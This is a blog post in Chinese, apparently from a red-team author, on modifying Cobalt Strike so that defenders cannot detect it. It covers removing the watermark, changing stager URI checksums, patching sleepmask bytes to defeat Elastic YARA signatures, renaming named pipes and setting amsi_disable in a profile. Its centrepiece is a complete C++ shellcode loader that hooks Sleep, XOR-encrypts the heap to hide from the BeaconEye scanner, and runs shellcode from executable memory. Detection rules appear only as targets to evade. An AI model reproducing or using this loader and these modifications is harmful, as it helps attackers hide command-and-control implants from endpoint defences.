@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>CobaltStrike特征Bypass | Hurn's Blog</title><meta name="description" content="CobaltStrike特征Bypass - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">CobaltStrike特征Bypass</h1><div class="post-info"><a></a>2022-05-28</div><div class="post-content"><blockquote>
+<p>建议使用IDEA的反编译插件，用luyten弄出来的问题贼多。</p>
+<p>java -cp /Applications/IntelliJ\ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike.jar decode</p>
+</blockquote>
+<h1 id="去水印"><a href="#去水印" class="headerlink" title="去水印"></a>去水印</h1><p>这是个与认证相关的东西，如果没有认证会加上这个特定的字符串在配置中</p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220530125915785.png" alt="image-20220530125915785"></p>
+<h1 id="checksum8"><a href="#checksum8" class="headerlink" title="checksum8"></a>checksum8</h1><p>stager默认自带一个生成符合checkSum8算法URI的的模块，这使得在没有Profile文件时也能够上线</p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220529202207090.png" alt="image-20220529202207090"></p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220529202722334.png" alt="image-20220529202722334"></p>
+<p>直接改完之后发现有不能生成stageExe，不知道是否有暗桩</p>
+<p>按这个改URL的位数：</p>
+<p><a target="_blank" rel="noopener" href="https://ucasers.cn/%E5%AF%B9cobaltstrike4.4%E7%9A%84%E7%AE%80%E5%8D%95%E9%AD%94%E6%94%B9/#title-14">https://ucasers.cn/%E5%AF%B9cobaltstrike4.4%E7%9A%84%E7%AE%80%E5%8D%95%E9%AD%94%E6%94%B9/#title-14</a></p>
+<h1 id="新出的漏洞"><a href="#新出的漏洞" class="headerlink" title="新出的漏洞"></a>新出的漏洞</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247489846&amp;idx=1&amp;sn=181c223cab4bce4e06def94604166348">https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247489846&amp;idx=1&amp;sn=181c223cab4bce4e06def94604166348</a></p>
+<p>cloudstrike/WebServer.java</p>
+<pre><code class="java">if (!uri.startsWith(&quot;/&quot;)) &#123;
+    return this.processResponse(uri, method, header, param, false, null, new Response(&quot;400 Bad Request&quot;, &quot;text/plain&quot;, &quot;&quot;));
+&#125;
+</code></pre>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220530122315163.png" alt="image-20220530122315163"></p>
+<h1 id="obfuscate-Profile"><a href="#obfuscate-Profile" class="headerlink" title="obfuscate Profile"></a>obfuscate Profile</h1><p>这个混淆profile的异或密钥，改一下，其实没啥大用，怎么改两个字节能爆破出来。</p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220529203456518.png" alt="image-20220529203456518"></p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220529204148934.png" alt="image-20220529204148934"></p>
+<h1 id="sleep内存签名"><a href="#sleep内存签名" class="headerlink" title="sleep内存签名"></a>sleep内存签名</h1><p>sleepmask的时候只会混淆数据，而解密的代码不会处理，就是下面这部分规则：</p>
+<pre><code class="txt">rule cobaltstrike_beacon_4_2_decrypt
+&#123;
+meta:
+    author = &quot;Elastic&quot;
+    description = &quot;Identifies deobfuscation routine used in Cobalt Strike Beacon DLL version 4.2.&quot;
+strings:
+    $a_x64 = &#123;4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03&#125;
+    $a_x86 = &#123;8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85 C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2&#125;
+condition:
+     any of them
+&#125;
+</code></pre>
+<p>处理一下：sleepmask.x64.o、sleepmask.x86.o这两个文件 ，跳转一下结构：</p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220529211620186.png" alt="image-20220529211620186"></p>
+<pre><code class="txt">.text:0000000000000071                                                        ; sleep_mask+B7↓j
+.text:0000000000000071 45 8B 0A                       mov     r9d, [r10]
+.text:0000000000000074 45 8B 5A 04                    mov     r11d, [r10+4]
+.text:0000000000000078 4D 8D 52 08                    lea     r10, [r10+8]
+.text:000000000000007C 45 85 C9                       test    r9d, r9d
+.text:000000000000007F 75 05                          jnz     short loc_86
+.text:0000000000000081 45 85 DB                       test    r11d, r11d
+.text:0000000000000084 74 33                          jz      short loc_B9
+
+45 8B 0A 45 8B 5A 04
+45 8B 5A 04 45 8B 0A
+</code></pre>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220530130714040.png" alt="image-20220530130714040"></p>
+<h1 id="BeaconEye"><a href="#BeaconEye" class="headerlink" title="BeaconEye"></a>BeaconEye</h1><p>BeaconEye会去检测c2profile的结构，这部分可以直接hook Sleep混淆堆，原文:<br><a href="https:">https://www.arashparsa.com/hook-heaps-and-live-free/</a></p>
+<pre><code class="c++">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &quot;MinHook.h&quot;
+
+
+typedef VOID(WINAPI* MySleep)(DWORD dwMilliseconds);  //函数的定义
+
+MySleep fpSleep = NULL;
+
+
+
+VOID Xor(char* buffer, size_t length) &#123;
+    const char key[4] = &quot;abc&quot;;
+    size_t keySize = sizeof(key);
+
+    for (size_t i = 0; i &lt; length; ++i) &#123;
+        buffer[i] ^= key[i % keySize];
+    &#125;
+&#125;
+
+VOID EncryptHeap() &#123;
+    PROCESS_HEAP_ENTRY heapEntry = &#123; 0 &#125;;
+    HANDLE hHeap = GetProcessHeap();
+    while (HeapWalk(hHeap, &amp;heapEntry))
+    &#123;
+        if (heapEntry.wFlags &amp; PROCESS_HEAP_ENTRY_BUSY)
+        &#123;
+            Xor((char*)heapEntry.lpData, heapEntry.cbData);
+        &#125;
+    &#125;
+&#125;
+
+void DoSuspendThreads(DWORD targetProcessId, DWORD targetThreadId)
+&#123;
+    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (h != INVALID_HANDLE_VALUE)
+    &#123;
+        THREADENTRY32 te;
+        te.dwSize = sizeof(te);
+        if (Thread32First(h, &amp;te))
+        &#123;
+            do
+            &#123;
+                if (te.dwSize &gt;= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))
+                &#123;
+                    // Suspend all threads EXCEPT the one we want to keep running
+                    if (te.th32ThreadID != targetThreadId &amp;&amp; te.th32OwnerProcessID == targetProcessId)
+                    &#123;
+                        HANDLE thread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+                        if (thread != NULL)
+                        &#123;
+                            SuspendThread(thread);
+                            CloseHandle(thread);
+                        &#125;
+                    &#125;
+                &#125;
+                te.dwSize = sizeof(te);
+            &#125; while (Thread32Next(h, &amp;te));
+        &#125;
+        CloseHandle(h);
+    &#125;
+&#125;
+
+void DoResumeThreads(DWORD targetProcessId, DWORD targetThreadId)
+&#123;
+    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (h != INVALID_HANDLE_VALUE)
+    &#123;
+        THREADENTRY32 te;
+        te.dwSize = sizeof(te);
+        if (Thread32First(h, &amp;te))
+        &#123;
+            do
+            &#123;
+                if (te.dwSize &gt;= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))
+                &#123;
+                    // Suspend all threads EXCEPT the one we want to keep running
+                    if (te.th32ThreadID != targetThreadId &amp;&amp; te.th32OwnerProcessID == targetProcessId)
+                    &#123;
+                        HANDLE thread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+                        if (thread != NULL)
+                        &#123;
+                            ResumeThread(thread);
+                            CloseHandle(thread);
+                        &#125;
+                    &#125;
+                &#125;
+                te.dwSize = sizeof(te);
+            &#125; while (Thread32Next(h, &amp;te));
+        &#125;
+        CloseHandle(h);
+    &#125;
+&#125;
+
+VOID WINAPI DetourSleep(DWORD dwMilliseconds) &#123;
+    DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
+    EncryptHeap();
+    fpSleep(dwMilliseconds);
+    EncryptHeap();
+    DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
+&#125;
+
+int main()
+&#123;
+    if (MH_Initialize() != MH_OK) return 1;
+    if (MH_CreateHook(&amp;Sleep, &amp;DetourSleep, reinterpret_cast&lt;LPVOID*&gt;(&amp;fpSleep)) != MH_OK) return 1;
+    if (MH_EnableHook(&amp;Sleep) != MH_OK) return 1;
+
+
+    unsigned char buf[] = &quot;&quot;;
+
+
+    void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, buf, sizeof buf);
+    ((void(*)())exec)();
+&#125;
+
+</code></pre>
+<p>右侧为BeaconEye的扫描结果，可以看来两个beacon ，下面的HookSleep没有扫出来。</p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220529211945519.png" alt="image-20220529211945519"></p>
+<p>另外就是调整这个结构，</p>
+<p><a target="_blank" rel="noopener" href="https://ucasers.cn/%E5%AF%B9cobaltstrike4.4%E7%9A%84%E7%AE%80%E5%8D%95%E9%AD%94%E6%94%B9/#title-18">https://ucasers.cn/%E5%AF%B9cobaltstrike4.4%E7%9A%84%E7%AE%80%E5%8D%95%E9%AD%94%E6%94%B9/#title-18</a></p>
+<h1 id="Beacon通信管道"><a href="#Beacon通信管道" class="headerlink" title="Beacon通信管道"></a>Beacon通信管道</h1><p><a target="_blank" rel="noopener" href="https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/">https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/</a></p>
+<p><a target="_blank" rel="noopener" href="https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575">https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575</a></p>
+<p>Beacon执行任务的时候会创建一个管道读写数据。</p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220529213341582.png" alt="image-20220529213341582"></p>
+<p>检测yara:</p>
+<pre><code>rule cs_job_pipe
+&#123;
+    meta:
+        description = &quot;Detects CobaltStrike Post Exploitation Named Pipes&quot;
+        author = &quot;Riccardo Ancarani &amp; Jon Cave&quot;
+        date = &quot;2020-10-04&quot;
+    strings:
+        $pipe = /\\\\\.\\pipe\\[0-9a-f]&#123;7,10&#125;/ ascii wide fullword
+        $guidPipe = /\\\\\.\\pipe\\[0-9a-f]&#123;8&#125;\-/ ascii wide
+    condition:
+        $pipe and not ($guidPipe)
+&#125;
+</code></pre>
+<p>profile</p>
+<pre><code>post-ex &#123;
+    
+    set spawnto_x86 &quot;%windir%\\syswow64\\dllhost.exe&quot;;
+    set spawnto_x64 &quot;%windir%\\sysnative\\dllhost.exe&quot;;
+
+    set obfuscate &quot;true&quot;;
+    set smartinject &quot;true&quot;;
+    set amsi_disable &quot;true&quot;;
+
+    set pipename &quot;pipe\\CtxSharefilepipe###,&quot;;
+    
+&#125;
+</code></pre>
+<h1 id="yara"><a href="#yara" class="headerlink" title="yara"></a>yara</h1><p>测yara的时候发现还有一个规则过不去：</p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220529212607619.png" alt="image-20220529212607619"></p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220529212557428.png" alt="image-20220529212557428"></p>
+<p>这部分在内存里面可以看到是字符串 <code>sprnt</code> 这个东西有点像什么加密库里面的函数， 69 69 69 69 则是字符串<code>iiii</code> 这部分应该能通过profile进行内存替换，具体没有测试，相信大厂不会拿这种简单的字符串做特征检测。</p>
+<p><img src="/2022/05/28/CobaltStrike%E7%89%B9%E5%BE%81Bypass/image-20220528221401438.png" alt="image-20220528221401438"></p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>服务端主要改了stageURI相关的一些特征，beacon端建议直接hook sleep ，c2profile的一些默认的行为，比如进程注入、命名管道、字符串等，都可以自定义更改。</p>
+<p>后面可以考虑怎么把一些已经重写过的beacon加入进来。</p>
+<p>检测CS的一些方法：</p>
+<p><a target="_blank" rel="noopener" href="https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/">https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MichaelKoczwara/Awesome-CobaltStrike-Defence">https://github.com/MichaelKoczwara/Awesome-CobaltStrike-Defence</a></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://buaq.net/go-109319.html">https://buaq.net/go-109319.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://ucasers.cn/%E5%AF%B9cobaltstrike4.4%E7%9A%84%E7%AE%80%E5%8D%95%E9%AD%94%E6%94%B9">https://ucasers.cn/%E5%AF%B9cobaltstrike4.4%E7%9A%84%E7%AE%80%E5%8D%95%E9%AD%94%E6%94%B9</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzA3MDY2NjMxMA==&amp;mid=2247484641&amp;idx=1&amp;sn=014f6c4ad5343e3f5034c33dffa66f26&amp;chksm=9f3815c8a84f9cde1c7493ff29cfc89c0474fec48ede52be618727e7b9a5ab321c4743e1a44c&amp;mpshare=1&amp;scene=23&amp;srcid=1202NA46yt71CvD3BMGKS10c&amp;sharer_sharetime=1606892728447&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">https://mp.weixin.qq.com/s?__biz=MzA3MDY2NjMxMA==&amp;mid=2247484641&amp;idx=1&amp;sn=014f6c4ad5343e3f5034c33dffa66f26&amp;chksm=9f3815c8a84f9cde1c7493ff29cfc89c0474fec48ede52be618727e7b9a5ab321c4743e1a44c&amp;mpshare=1&amp;scene=23&amp;srcid=1202NA46yt71CvD3BMGKS10c&amp;sharer_sharetime=1606892728447&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd</a></p>
+</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/05/31/%E5%90%83%E7%93%9CFollina-Office-RCE/">prev</a><a class="next" href="/2022/05/26/2%20Afkayas%20fad7e6f3684147f8abf9e53d6d8c0d4d/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>
